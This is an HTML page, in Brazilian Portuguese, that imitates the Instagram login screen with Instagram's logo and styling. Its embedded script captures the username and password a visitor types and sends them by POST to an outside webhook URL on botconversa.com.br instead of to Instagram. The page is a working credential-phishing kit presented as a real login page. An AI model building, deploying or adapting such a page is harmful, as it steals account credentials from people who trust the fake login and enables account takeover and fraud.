<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: white;
            padding: 20px;
            border: 1px solid #dbdbdb;
            text-align: center;
            width: 300px;
        }
        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
        }
        .login-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 3px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #0077cc;
        }
    </style>
    <script>
        function sendLogin(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            fetch('https://new-backend.botconversa.com.br/api/v1/webhooks-automation/catch/155079/1Q08XOfVAYfB/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: username,
                    password: password
                })
            }).then(response => response.json())
              .then(data => console.log('Success:', data))
              .catch(error => console.error('Error:', error));
        }
    </script>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        <form onsubmit="sendLogin(event)">
            <input type="text" id="username" placeholder="Telefone, nome de usuÃ¡rio ou email" required>
            <input type="password" id="password" placeholder="Senha" required>
            <button class="login-btn" type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>
